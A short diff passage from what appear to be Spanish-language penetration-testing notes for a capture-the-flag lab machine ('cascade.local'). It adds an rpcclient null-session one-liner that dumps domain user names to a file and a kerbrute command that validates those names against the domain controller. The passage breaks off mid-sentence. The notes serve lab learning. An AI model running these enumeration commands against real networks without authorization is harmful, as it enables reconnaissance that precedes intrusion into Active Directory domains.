@@ -32,3 +32,13 @@ rpcclient -U "" 10.129.9.250 -N
 enumdomusers
 ```
 
+```shell
+rpcclient -U "" 10.129.9.250 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
+```
+
+Validación de usuarios con  [[KERBRUTE]]
+```shell
+kerbrute userenum --dc 10.129.9.250 -d cascade.local users.txt
+```
+
+Validando los usuarios se nos 
